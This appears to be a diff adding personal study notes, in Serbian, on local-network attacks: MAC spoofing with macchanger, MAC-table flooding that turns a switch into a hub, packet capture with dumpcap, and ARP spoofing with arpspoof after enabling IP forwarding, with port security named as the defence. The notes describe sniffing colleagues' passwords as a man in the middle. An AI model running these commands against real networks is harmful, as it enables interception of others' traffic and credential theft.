@@ -1,0 +1,93 @@
+#########################################
+### Kako SPOOF-ovati svoju MAC adresu ###
+#########################################
+
+
+# Prvo "ugasi" svoj interfes za koji zelis da promenis MAC adresu
+$sudo ip link set dev wlsi1 down
+
+# Postavi RANDOM vrednost(zato "-r" ocpija) kao MAC adresu za wlsi1 interfejs
+$sudo macchanger -r wlsi1
+
+# Ponovo omoguci(tj. "podigni") interfejs
+$sudo ip link set dev wlsi1 up
+
+# Proveri koja je MAC adresa interfejsa
+$ifconfig
+
+
+
+
+Kada se prvi put povezujes na switch, ti saljes svoju MAC adresu switc-u, a
+switch je belezi u svojoj tabeli(ARP):
+
+    Port 1: <MAC_Address>
+
+Medjutim, ako ti spoof-ujes svoju MAC adresu i "javljas" se na isti port sa
+razlicitim IP Adresama, ono sto ce se desiti jeste da ce sama MAC Tabela da se
+popuni.
+
+Kada nema vise mesta za NOVE MAC adrese, Switch krece da se ponasa kao "Hub".
+
+Odnosno, napadac bi dosao pre svih u firmu npr. i uradio ovaj napad. Sve ostale
+kolege koje bi naknadno dosle, kada bi se "javile" switch-u, Switch ne bi mogao
+da zabelezi njihove MAC adrese i zbog toga bi SVAKI NJIHOV PAKET koji je poslat
+na Default Gateway(tj. na taj switch) bio Flood-ovan na SVE port-ove, cime bi
+se taj Switch sustinski ponasao kao Hub.
+
+U toj slucaju, napadac(onaj sa port-a 1) bi mogao da snima saobracaj pre nego
+sto svi dodju, i nakon sto svi se povezu svaki paket bi mogao da procita, cime
+bi sustinski sebe nacinio "Man in the middle"-om.
+
+Pogotovo je zgodno da je "Man in the middle" cim se oni povezu jer na pocetku
+svi kucaju svoje lozinke.
+
+
+Resenje za ovakav problem jeste: "switch port security", odnosno da se NE DA ni
+jednom port-u da zabelezi u svojoj tabeli vise od jedne MAC adrese po port-u.
+
+Ali ovo je nesto sto mora da se ukljuci!
+
+Znaci to su SWITCH-evi koji malo vise kostaju, to NISU nasi switch-evi kuci.
+Sto znaci da ja mogu da uradim ovaj napad u svojoj kuci!
+
+Na port izmedju dva Switch-a NE SME da se postavi ovaj "Switch port security"
+zato sto se prirodno pojavljuje veci broj racunara, pa ukljucivanje ovoga bi
+onemogucilo da vise ljudi iz iste mreze ide na internet.
+
+-------------------------------------------------------------------------------
+##########################
+### Komande objasnjene ###
+##########################
+
+sudo dumpcap -i eth0 -w /tmp/cap2.pcapng
+
+    "dumpcap" dolazi bundled sa wireshark-om i to je ono sto i Wireshark i
+    TShark koriste u pozadini.
+
+    -i <interfejs>  // Na kom interfejsu da snima pakete
+
+    "dumpcap" upisuje "raw" pcapng fajlove.
+
+    -w <file>  // "Write" 
+
+
+sysctl net.ipv4.ip_forward
+
+    "sysctl"   // Konfigures kernel parametre u runtime-u!
+
+    net.ipv4.ip_frward  // Prikazu status: da li je "forward"-ovanje ukljuceno
+
+
+    Ako je odgovor 0, onda ukljuci sa:
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+
+sudo arpspoof -i eth0 -t 192.168.x.1 192.168.x.3
+
+    Na MOM interfejsu eth0, posalji ARP paket gde tvrdim da je MOJA MAC-adresa,
+    adresa koja odgovara lokalnom racunaru: 192.168.x.3
+
+    A onaj KOME saljem je: 192.168.x.1      // Odnosno, to je TARGET
+
